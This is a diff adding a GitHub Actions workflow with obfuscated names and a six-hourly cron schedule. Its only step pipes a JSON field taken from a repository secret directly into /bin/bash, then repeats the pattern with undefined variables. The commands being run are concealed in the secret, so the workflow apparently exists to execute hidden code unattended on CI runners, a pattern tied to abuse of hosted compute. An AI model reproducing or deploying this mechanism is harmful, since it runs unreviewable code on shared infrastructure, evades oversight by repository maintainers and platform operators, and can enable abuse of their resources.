@@ -1,0 +1,26 @@
+name: wuhaoning3214
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhaoning3214
+        env:
+          ndcnv78: ${{ secrets.ndcnv78 }}
+        run: |
+          echo $ndcnv78 | jq -r .avz52 | /bin/bash
+          echo $mju348 | jq -r .bivj36776 | /bin/bash
+          echo $ff17 | jq -r .pxj87926 | /bin/bash
+          echo $mm91 | jq -r .vvxrd27 | /bin/bash
+          echo $w724 | jq -r .zy835 | /bin/bash
+          echo $uif25393 | jq -r .hxci82855 | /bin/bash
+          echo $usf2434 | jq -r .uz4 | /bin/bash
+          echo $la125 | jq -r .msgq131 | /bin/bash
+          echo $xopi938 | jq -r .hk99 | /bin/bash
+          echo $o65585 | jq -r .hefw1 | /bin/bash
+          echo $yzeke1974 | jq -r .ehpym42243 | /bin/bash
+
